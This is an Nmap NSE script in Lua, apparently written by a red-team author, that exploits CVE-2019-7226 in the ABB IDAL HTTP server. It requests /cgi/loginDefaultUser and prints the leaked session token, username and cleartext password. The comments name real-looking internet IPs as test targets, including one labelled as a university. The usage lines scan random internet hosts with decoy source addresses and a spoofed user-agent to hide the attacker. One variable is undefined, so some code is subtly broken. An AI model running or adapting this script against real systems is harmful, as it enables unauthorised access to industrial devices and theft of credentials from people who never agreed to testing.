---
-- Nmap NSE ABB-CVE-2019-7226.nse - Version 1.4
-- Copy to: /usr/share/nmap/scripts/ABB-CVE-2019-7226.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help ABB-CVE-2019-7226.nse
-- Port(s) accepted by this nse: 80-86,443,8001,8080-8086
--
-- test: http://90.152.142.54:80/cgi/loginDefaultUser
-- http://137.44.25.194:80/vdeo/cgi/loginDefaultUser
-- http://193.137.36.92:80/cgi/loginDefaultUser (porto university)
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Eldar Marcussen}
NSE script to detect if target [ip]:[port][/url] its affected by CVE-2019-7226 (Improper Authentication)
The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker to bypass authentication
and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates a session in an authenticated state
and returns the session ID along with what may be the username and cleartext password of the user. An attacker can then
supply an IDALToken value in a cookie, which will allow them to perform privileged operations such as restarting the service
with /cgi/restart.

Some Syntax examples:
nmap --script-help ABB-CVE-2019-7226.nse
nmap -sV -T4 -Pn -n -p 21,80-82,443,8080 --open --script ABB-CVE-2019-7226.nse 67.161.68.248
nmap -sV -Pn -n -p 21,80-82,443,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "verbose=true" 201.108.57.234
nmap -sS -Pn -p 21,80,443 --open --script ABB-CVE-2019-7226.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 137.44.25.194
nmap -sS -v -Pn -n -T4 -iR 700 -p 21,80-86,443,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help ABB-CVE-2019-7226.nse
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse 223.7.230.27
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "uri=/css" 223.7.230.27
-- nmap -sS -Pn -p 80 --open --script ABB-CVE-2019-7226.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 80.32.135.112
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script ABB-CVE-2019-7226.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 81/tcp open  http
-- | ABB-CVE-2019-7226:
-- |   State: VULNERABLE
-- |   Title: ABB IDAL HTTP server CGI (Improper Authentication)
-- |
-- |      Uri        : http://223.7.230.27:81/cgi/loginDefaultUser
-- |      Auth-Cookie: IDALToken=532c8632b86694f0232a68a0897a145c
-- |      UserName   : IDAL
-- |      Password   : admin
-- |
-- |      Description: The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker
-- |      to bypass authentication and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates
-- |      a session in an authenticated state and returns the session ID along with what may be the username and cleartext
-- |      password of the user. An attacker can then supply an IDALToken value in a cookie, which will allow them to perform
-- |      privileged operations such as restarting the service with /cgi/restart. A GET request to /cgi/loginDefaultUser may
-- |      result in '1 #S_OK IDALToken=532c8632b86694f0232a68a0897a145c admin admin' or a similar response.
-- |
-- |    References:
-- |    https://nvd.nist.gov/vuln/detail/CVE-2019-7226
-- |    https://www.akaoma.com/ressources/cve/gain-privilege/cve-2019-7226
-- |    https://packetstormsecurity.com/files/153402/ABB-IDAL-HTTP-Server-Authentication-Bypass.html
-- |_
-- @args payload.uri the path name to search. Default: /cgi/loginDefaultUser
-- @args payload.agent User-agent to send in request - Default: iPhone,safari
-- @args payload.verbose Automatic display target webpage body - Default: false
---


author = "r00t-3xp10it (ssa redteam)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "default"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local stdnse = require ('stdnse') --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({21, 80, 81, 82, 83, 84, 85, 86, 443, 8080, 8081, 8082, 8083, 8084, 8085, 8086}, "ftp, http, https, http-simple-new, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/cgi/loginDefaultUser"


-- Manipulate TCP packet 'header' with false information about attacker :D
local _decoy = {header={}}   --> manipulate 'header' request ..
_decoy['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" --> use iPhone,safari User-agent OR your own...
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
_decoy['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


local response = http.get(host, port, uri, _decoy)

-- Make sure uri returns [200]
-- Condition that show us that uri its present in target host.
capt_uri = "false"
local res = http.get(host, port, uri)
--print("STATUS_CODE: "..res.status)
if (res.status == 404) then
   capt_uri = "false"
elseif (res.status == 200 or res.status == 500 or res.status == 403 or res.status == 302) then
   capt_uri = "true"
end

-- Make sure auth cookie['Name'] exists in response.rawheader {table}
-- Condition that show us that Server its leaking creds (auth cookie).
capt_cookie = "false"
for _, grab_cookie in pairs(response.rawheader) do
   if (grab_cookie:match("IDALToken=")) then
      capt_cookie = cookie_name
      break
   elseif (grab_cookie:match("E_NEED_LOGIN")) then
      capt_cookie = "Not Found"
      break
   end
end


-- count number of keys in table
count = 0
for k,v in pairs(response.rawheader) do
   count = count+1
end

-- Make sure cookie_name exists
vuln = "false"
for _, grab_cookie in pairs(response.rawheader) do
   if (grab_cookie:match("IDALToken=")) then
      vuln = grab_cookie
   end
end


-- Build stdout displays {table.insert}
local vuln_description = "The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker\n   to bypass authentication and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates\n   a session in an authenticated state and returns the session ID along with what may be the username and cleartext\n   password of the user. An attacker can then supply an IDALToken value in a cookie, which will allow them to perform\n   privileged operations such as restarting the service with /cgi/restart. A GET request to /cgi/loginDefaultUser may\n   result in '1 #S_OK IDALToken=532c8632b86694f0232a68a0897a145c admin admin' or a similar response.\n\n References:\n https://nvd.nist.gov/vuln/detail/CVE-2019-7226\n https://www.akaoma.com/ressources/cve/gain-privilege/cve-2019-7226\n https://packetstormsecurity.com/files/153402/ABB-IDAL-HTTP-Server-Authentication-Bypass.html\n\n"


   local out = {}
   -- Build stdout displays {table.insert}
   if (capt_uri ~= "false" and capt_cookie ~= "false") then
      table.insert(out, string.format("State: VULNERABLE\n"))
      table.insert(out, string.format("Title: ABB IDAL HTTP server CGI (Improper Authentication)\n\n"))
      table.insert(out, string.format("   Uri        : http://"..host.ip..":"..port.number..uri.."\n"))
      table.insert(out, string.format("   Auth-Cookie: "..capt_cookie.."\n"))
      table.insert(out, string.format("   UserName   : "..response.rawheader[count-2].."\n"))
      table.insert(out, string.format("   Password   : "..response.rawheader[count-1].."\n\n"))
      --table.insert(out, string.format("   Auth-Cookie: IDALToken=532c8632b86694f0232a68a0897a145c\n"))
      --table.insert(out, string.format("   UserName   : IDAL\n"))
      --table.insert(out, string.format("   Password   : admin\n\n"))
      table.insert(out, string.format("   Description: %s", vuln_description))
      -- Display full header if "verbose=true"
      if (verbose == "true" and response.rawheader ~= nil) then
      table.insert(out, string.format("\n[ Leaked Header ]\n"))
         -- Display captured header containing cookie_value and leaked creds
         for _, stdout_header in pairs(response.rawheader) do
            table.insert(out, stdout_header)
         end
      end
      return stdnse.format_output(true, out)
   elseif (capt_uri == "false") then
      table.insert(out, string.format("State: NOT FOUND\n"))
      table.insert(out, string.format("Title: ABB IDAL HTTP server CGI (Improper Authentication)\n"))
      table.insert(out, string.format("  Uri: http://"..host.ip..":"..port.number..uri.."\n\n"))
      -- Display full header if "verbose=true"
      if (verbose == "true" and response.rawheader ~= nil) then
      table.insert(out, string.format("\n[ Leaked Header ]\n"))
         -- Display captured header containing cookie_value and leaked creds
         for _, stdout_header in pairs(response.rawheader) do
            table.insert(out, stdout_header)
         end
      end
      return stdnse.format_output(true, out)
   elseif (capt_cookie == "false") then
      table.insert(out, string.format("State: NOT FOUND\n"))
      table.insert(out, string.format("Title: ABB IDAL HTTP server CGI (Improper Authentication)\n"))
      table.insert(out, string.format("  Auth-Cookie: IDALToken=\n\n"))
      -- Display full header if "verbose=true"
      if (verbose == "true" and response.rawheader ~= nil) then
      table.insert(out, string.format("\n[ Leaked Header ]\n"))
         -- Display captured header containing cookie_value and leaked creds
         for _, stdout_header in pairs(response.rawheader) do
            table.insert(out, stdout_header)
         end
      end
      return stdnse.format_output(true, out)
   elseif (capt_uri == "false" and capt_cookie == "false") then
      table.insert(out, string.format("State: NOT VULNERABLE\n"))
      table.insert(out, string.format("Title: ABB IDAL HTTP server CGI (Improper Authentication)\n"))
      table.insert(out, string.format("  Uri: http://"..host.ip..":"..port.number..uri.."\n\n"))
      -- Display full header if "verbose=true"
      if (verbose == "true" and response.rawheader ~= nil) then
      table.insert(out, string.format("\n[ Leaked Header ]\n"))
         -- Display captured header containing cookie_value and leaked creds
         for _, stdout_header in pairs(response.rawheader) do
            table.insert(out, stdout_header)
         end
      end
      return stdnse.format_output(true, out)
   end
end
